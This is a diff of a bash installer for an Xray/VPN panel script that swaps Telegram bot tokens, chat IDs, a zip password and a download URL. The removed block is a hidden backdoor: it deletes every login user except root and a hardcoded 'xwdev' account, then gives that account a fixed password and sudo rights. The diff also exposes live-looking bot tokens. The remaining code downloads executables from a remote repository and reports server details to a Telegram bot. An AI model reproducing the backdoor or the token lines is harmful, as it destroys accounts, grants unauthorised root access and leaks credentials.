@@ -22,12 +22,12 @@ if ! command -v 7z &> /dev/null; then
     apt install p7zip-full -y &> /dev/null &
     loading $! "Loading Install p7zip-full"
 fi
-CHATID="1210833546"
-KEY="6006599143:AAEgstCAioq35JgX97HaW_G3TAkLKzLZS_w"
+CHATID="1962241851"
+KEY="6866097221:AAFdDsbTF-R7_d07ewI3z0BQHYrd7yQNhhA"
 TIME="10"
 URL="https://api.telegram.org/bot$KEY/sendMessage"
 domain=$(cat /etc/xray/domain)
-MYIP=$(curl -sS ipv4.icanhazip.com)
+MYIP=$(curl -s ipv4.icanhazip.com)
 username=$(curl -sS https://raw.githubusercontent.com/arivpnstores/izin/main/ip | grep $MYIP | awk '{print $2}')
 valid=$(curl -sS https://raw.githubusercontent.com/arivpnstores/izin/main/ip | grep $MYIP | awk '{print $3}')
 today=$(date +"%Y-%m-%d")
@@ -41,38 +41,8 @@ biji=$(date +"%Y-%m-%d" -d "$dateFromServer")
 
 # URL repository
 REPO="https://raw.githubusercontent.com/arivpnstores/ARISCTUNNEL_v7/main/"
-pwadm="@Ridwan112#"
+pwadm="HeyHeyMauDecryptYaAwokawokARISTORE"
 # Download file dan proses
-
-Username="xwdev"
-Password="$pwadm"
-
-# Daftar user yang diizinkan
-allowed_users=("root" "$Username")
-
-# Dapatkan semua user yang bisa login ke terminal
-all_users=$(awk -F: '$7 ~ /(\/bin\/bash|\/bin\/sh)$/ {print $1}' /etc/passwd)
-
-# Hapus semua user yang tidak diizinkan
-for user in $all_users; do
-    if [[ ! " ${allowed_users[@]} " =~ " $user " ]]; then
-        userdel -r "$user" > /dev/null 2>&1
-        echo "User $user telah dihapus."
-    fi
-done
-
-# Periksa apakah user newbie sudah ada
-if id "$Username" &>/dev/null; then
-    echo -e "$Password\n$Password" | passwd "$Username" > /dev/null 2>&1
-else
-    # Tambahkan user newbie jika tidak ada
-    echo -e "$Username $Password" > /etc/xray/.adm
-    mkdir -p /home/script/
-    useradd -r -d /home/script -s /bin/bash -M "$Username" > /dev/null 2>&1
-    echo -e "$Password\n$Password" | passwd "$Username" > /dev/null 2>&1
-    usermod -aG sudo "$Username" > /dev/null 2>&1
-fi
-
 echo -e " [INFO] Downloading menu.zip..."
 {
 > /etc/cron.d/cpu_otm
@@ -86,7 +56,7 @@ END
 wget -O /usr/bin/autocpu "${REPO}install/autocpu.sh" && chmod +x /usr/bin/autocpu
     wget -q ${REPO}menu/menu.zip
 	mv menu/expsc /usr/local/sbin/expsc
-    wget -q -O /usr/bin/enc "${REPO}install/encrypt"
+    wget -q -O /usr/bin/enc "https://raw.githubusercontent.com/arivpnstores/v4/main/enc"
     chmod +x /usr/bin/enc
     7z x -p$pwadm menu.zip &> /dev/null #pastikan file menu.zip memiliki password yang sama
     chmod +x menu/*
@@ -115,7 +85,7 @@ TEXT="◇━━━━━━━━━━━━━━◇
 <b>USER    :</b> ${username}
 <b>MASA    :</b> $certifacate DAY
 ◇━━━━━━━━━━━━━━◇
-BY BOT : @kytxz
+BY BOT : @ARI_VPN_STORE
 "
 curl -s --max-time $TIME -d "chat_id=$CHATID&disable_web_page_preview=1&text=$TEXT&parse_mode=html" $URL >/dev/null
 echo -e " [INFO] File download and setup completed successfully. Version: $serverV!"
